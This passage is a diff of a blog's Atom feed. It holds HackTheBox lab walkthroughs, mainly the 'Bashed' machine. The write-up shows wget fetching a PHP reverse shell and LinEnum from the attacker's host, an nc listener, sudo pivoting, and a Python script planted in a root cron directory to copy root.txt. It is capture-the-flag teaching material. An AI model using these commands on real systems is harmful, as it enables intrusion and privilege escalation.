-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;curl -X POST -F &lt;span class="s1"&gt;&amp;#39;action=get_alerts&amp;#39;&lt;/span&gt; http://127.0.0.1:8000 &lt;span class="p"&gt;;&lt;/span&gt; rm -r /tmp/hack &lt;span class="p"&gt;;&lt;/span&gt; mkdir -p /tmp/hack &lt;span class="p"&gt;;&lt;/span&gt; cp /var/www/bucket-app/files/* /tmp/hack &lt;span class="p"&gt;;&lt;/span&gt; cat /tmp/hack/result.pdf
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;curl -X POST -F &lt;span class="s1"&gt;&amp;#39;action=get_alerts&amp;#39;&lt;/span&gt; http://127.0.0.1:8000 &lt;span class="p"&gt;;&lt;/span&gt; rm -r /tmp/hack &lt;span class="p"&gt;;&lt;/span&gt; mkdir -p /tmp/hack &lt;span class="p"&gt;;&lt;/span&gt; cp /var/www/bucket-app/files/* /tmp/hack &lt;span class="p"&gt;;&lt;/span&gt; cat /tmp/hack/result.pdf
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;Thats the speed of light, babe! Inside the pdf content we can see this part:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/Type /EmbeddedFile
-/Length 33
-/Params 5 0 R
-&amp;gt;&amp;gt;
-stream
-3ba97200d588ae0d517c117a03396f10
-endstream
-endobj
-7 0 obj
-&amp;lt;&amp;lt;
-/Type /Filespec
-/F (root.txt)
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;/Type /EmbeddedFile&lt;/span&gt;
+&lt;span class="err"&gt;/Length 33&lt;/span&gt;
+&lt;span class="err"&gt;/Params 5 0 R&lt;/span&gt;
+&lt;span class="err"&gt;&amp;gt;&amp;gt;&lt;/span&gt;
+&lt;span class="err"&gt;stream&lt;/span&gt;
+&lt;span class="err"&gt;3ba97200d588ae0d517c117a03396f10&lt;/span&gt;
+&lt;span class="err"&gt;endstream&lt;/span&gt;
+&lt;span class="err"&gt;endobj&lt;/span&gt;
+&lt;span class="err"&gt;7 0 obj&lt;/span&gt;
+&lt;span class="err"&gt;&amp;lt;&amp;lt;&lt;/span&gt;
+&lt;span class="err"&gt;/Type /Filespec&lt;/span&gt;
+&lt;span class="err"&gt;/F (root.txt)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;Yay! See the root flag in the middle?&lt;/p&gt;</content><category term="HackTheBox"></category><category term="hackthebox"></category><category term="htb"></category><category term="solution"></category><category term="hacking"></category></entry><entry><title>Bashed</title><link href="/bashed.html" rel="alternate"></link><published>2020-01-13T20:00:00+01:00</published><updated>2020-01-13T20:00:00+01:00</updated><author><name>Paweł Mateja</name></author><id>tag:None,2020-01-13:/bashed.html</id><summary type="html">&lt;p&gt;Solution to the &lt;em&gt;Bashed&lt;/em&gt; VM&lt;/p&gt;</summary><content type="html">&lt;h1&gt;User flag&lt;/h1&gt;
 &lt;p&gt;It is not really necessary to start this one with &lt;strong&gt;nmap&lt;/strong&gt;, but it's never a bad first step&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@kali:~# nmap -sS -Pn -sV &lt;span class="m"&gt;10&lt;/span&gt;.10.10.68
-&lt;/pre&gt;&lt;/div&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;root@kali:~# nmap -sS -Pn -sV &lt;span class="m"&gt;10&lt;/span&gt;.10.10.68
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;Starting&lt;/span&gt; &lt;span class="n"&gt;Nmap&lt;/span&gt; &lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="mi"&gt;70&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;https&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="n"&gt;nmap&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;org&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;at&lt;/span&gt; &lt;span class="mi"&gt;2020&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;01&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;13&lt;/span&gt; &lt;span class="mi"&gt;13&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;20&lt;/span&gt; &lt;span class="n"&gt;CET&lt;/span&gt;
+&lt;span class="n"&gt;Nmap&lt;/span&gt; &lt;span class="n"&gt;scan&lt;/span&gt; &lt;span class="n"&gt;report&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="mi"&gt;68&lt;/span&gt;
+&lt;span class="k"&gt;Host&lt;/span&gt; &lt;span class="k"&gt;is&lt;/span&gt; &lt;span class="n"&gt;up&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="mi"&gt;11&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="n"&gt;latency&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;
+&lt;span class="k"&gt;Not&lt;/span&gt; &lt;span class="n"&gt;shown&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;999&lt;/span&gt; &lt;span class="n"&gt;closed&lt;/span&gt; &lt;span class="n"&gt;ports&lt;/span&gt;
+&lt;span class="n"&gt;PORT&lt;/span&gt;   &lt;span class="k"&gt;STATE&lt;/span&gt; &lt;span class="n"&gt;SERVICE&lt;/span&gt; &lt;span class="k"&gt;VERSION&lt;/span&gt;
+&lt;span class="mi"&gt;80&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;tcp&lt;/span&gt; &lt;span class="k"&gt;open&lt;/span&gt;  &lt;span class="n"&gt;http&lt;/span&gt;    &lt;span class="n"&gt;Apache&lt;/span&gt; &lt;span class="n"&gt;httpd&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="mi"&gt;18&lt;/span&gt; &lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;Ubuntu&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
 
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Starting Nmap 7.70 ( https://nmap.org ) at 2020-01-13 13:20 CET
-Nmap scan report for 10.10.10.68
-Host is up (0.11s latency).
-Not shown: 999 closed ports
-PORT   STATE SERVICE VERSION
-80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 10.24 seconds
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;span class="n"&gt;Service&lt;/span&gt; &lt;span class="n"&gt;detection&lt;/span&gt; &lt;span class="n"&gt;performed&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt; &lt;span class="n"&gt;Please&lt;/span&gt; &lt;span class="n"&gt;report&lt;/span&gt; &lt;span class="k"&gt;any&lt;/span&gt; &lt;span class="n"&gt;incorrect&lt;/span&gt; &lt;span class="n"&gt;results&lt;/span&gt; &lt;span class="k"&gt;at&lt;/span&gt; &lt;span class="n"&gt;https&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="n"&gt;nmap&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;org&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;submit&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="p"&gt;.&lt;/span&gt;
+&lt;span class="n"&gt;Nmap&lt;/span&gt; &lt;span class="n"&gt;done&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="n"&gt;IP&lt;/span&gt; &lt;span class="n"&gt;address&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="k"&gt;host&lt;/span&gt; &lt;span class="n"&gt;up&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;scanned&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="mi"&gt;24&lt;/span&gt; &lt;span class="n"&gt;seconds&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;As we can see, only port 80 is opened. After opening it in web browser, there is a unfinished, but already launched website. We can dig a bit through it, just to learn that it is connected to a &lt;strong&gt;phpbash&lt;/strong&gt; project. That's nice, but we want to speed things up.&lt;/p&gt;
 &lt;p&gt;We can run several tools to look for cool and useful, but hidden urls. My first choice here is DirBuster.
 It takes him a few minutes to find the thing we need:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;http://10.10.10.68/dev/phpbash.php
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c"&gt;http://10.10.10.68/dev/phpbash.php&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;After opening that link we know that we are in the right place. It's an online bash terminal. So wy not to try to look for the first flag?&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ ls /user
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ ls /user
 $ cat /home/arrexel/user.txt
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;Yup, we got it!&lt;/p&gt;
 &lt;h1&gt;Root flag&lt;/h1&gt;
 &lt;p&gt;&lt;em&gt;phpbash&lt;/em&gt; is nice, but doesn't provide a full terminal experience. A reverse shell is wat we need.&lt;/p&gt;
 &lt;p&gt;Firstly we need a place in the /var/www/html path to store it. Only the &lt;strong&gt;upload&lt;/strong&gt; dir will do, but we need nothing more. Except of course of a php reverse shell with out IP in it's config. I've already got it on my Kali VM, served by an apache instance, so it's easy:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;www-data:/var/www/html/uploads# wget &lt;span class="m"&gt;10&lt;/span&gt;.10.14.16/shell.php
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;www-data:/var/www/html/uploads# wget &lt;span class="m"&gt;10&lt;/span&gt;.10.14.16/shell.php
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;Now I can open netcat on my Kali, and load 10.10.10.68/upload/shell.php in my web browser.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@kali:/var/www/html# nc -v -n -l -p &lt;span class="m"&gt;1234&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;root@kali:/var/www/html# nc -v -n -l -p &lt;span class="m"&gt;1234&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;It works, so now the same thing in &lt;em&gt;/tmp&lt;/em&gt; dir &lt;em&gt;LinEnum&lt;/em&gt;&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nb"&gt;cd&lt;/span&gt; /tmp
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nb"&gt;cd&lt;/span&gt; /tmp
 wget &lt;span class="m"&gt;10&lt;/span&gt;.10.14.16/LinEnum.sh
 bash ./LinEnum.sh
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;We can see good stuff in it's output!&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[+] We can sudo without supplying a password!
-Matching Defaults entries for www-data on bashed:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;We&lt;/span&gt; &lt;span class="n"&gt;can&lt;/span&gt; &lt;span class="n"&gt;sudo&lt;/span&gt; &lt;span class="k"&gt;without&lt;/span&gt; &lt;span class="n"&gt;supplying&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;
+&lt;span class="n"&gt;Matching&lt;/span&gt; &lt;span class="k"&gt;Defaults&lt;/span&gt; &lt;span class="n"&gt;entries&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="k"&gt;data&lt;/span&gt; &lt;span class="k"&gt;on&lt;/span&gt; &lt;span class="n"&gt;bashed&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+    &lt;span class="n"&gt;env_reset&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;mail_badpass&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;secure_path&lt;/span&gt;&lt;span class="o"&gt;=/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="k"&gt;local&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;sbin&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="k"&gt;local&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;bin&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;sbin&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;bin&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;sbin&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;bin&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;snap&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;bin&lt;/span&gt;
 
-User www-data may run the following commands on bashed:
-    (scriptmanager : scriptmanager) NOPASSWD: ALL
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;span class="k"&gt;User&lt;/span&gt; &lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="k"&gt;data&lt;/span&gt; &lt;span class="n"&gt;may&lt;/span&gt; &lt;span class="n"&gt;run&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;following&lt;/span&gt; &lt;span class="n"&gt;commands&lt;/span&gt; &lt;span class="k"&gt;on&lt;/span&gt; &lt;span class="n"&gt;bashed&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+    &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;scriptmanager&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;scriptmanager&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;NOPASSWD&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="k"&gt;ALL&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;We knew about this user already from listing the home directory. Now we can sudo it.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo -u scriptmanager bash
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ sudo -u scriptmanager bash
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;Works. What next? We need something to find a point for privilege escalation. &lt;strong&gt;pspy&lt;/strong&gt; will help us with it.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;./pspy64
-&lt;/pre&gt;&lt;/div&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;./pspy64
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
-
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;2020&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;01&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;13&lt;/span&gt; &lt;span class="nt"&gt;05&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;46&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;01&lt;/span&gt; &lt;span class="nt"&gt;CMD&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;UID&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nt"&gt;0&lt;/span&gt;    &lt;span class="nt"&gt;PID&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nt"&gt;2297&lt;/span&gt;   &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;python&lt;/span&gt; &lt;span class="nt"&gt;test&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;py&lt;/span&gt;
-&lt;span class="nt"&gt;2020&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;01&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;13&lt;/span&gt; &lt;span class="nt"&gt;05&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;46&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;01&lt;/span&gt; &lt;span class="nt"&gt;CMD&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;UID&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nt"&gt;0&lt;/span&gt;    &lt;span class="nt"&gt;PID&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nt"&gt;2296&lt;/span&gt;   &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;bin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;sh&lt;/span&gt; &lt;span class="nt"&gt;-c&lt;/span&gt; &lt;span class="nt"&gt;cd&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;scripts&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="nt"&gt;for&lt;/span&gt; &lt;span class="nt"&gt;f&lt;/span&gt; &lt;span class="nt"&gt;in&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;py&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="nt"&gt;do&lt;/span&gt; &lt;span class="nt"&gt;python&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;$f&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="nt"&gt;done&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;2020/01/13 05:46:01 CMD: UID=0    PID=2297   | python test.py&lt;/span&gt;
+&lt;span class="err"&gt;2020/01/13 05:46:01 CMD: UID=0    PID=2296   | /bin/sh -c cd /scripts; for f in *.py; do python &amp;quot;$f&amp;quot;; done&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;Nice, we can see, that &lt;strong&gt;/scrips&lt;/strong&gt; dir is owned by &lt;strong&gt;scriptmanager&lt;/strong&gt;!&lt;/p&gt;
 &lt;p&gt;Now we need a tiny root.txt stealing python script. It doesn't need to be fancy.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;shutil&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;shutil&lt;/span&gt;
 &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;os&lt;/span&gt;
 &lt;span class="n"&gt;shutil&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;copy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/root/root.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/tmp/root.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;chmod 777 /tmp/root.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;As in every step, I've served it on my Kali apache, so:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ wget &lt;span class="m"&gt;10&lt;/span&gt;.10.14.16/bashed/run.py
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ wget &lt;span class="m"&gt;10&lt;/span&gt;.10.14.16/bashed/run.py
 
 sudo -u scriptmanager cp run.py /scripts
 $ cat /tmp/root.txt
-&lt;/pre&gt;&lt;/div&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;p&gt;IT'S ROOTED. It was not difficult but fun!&lt;/p&gt;</content><category term="HackTheBox"></category><category term="hackthebox"></category><category term="htb"></category><category term="solution"></category><category term="hacking"></category></entry></feed>
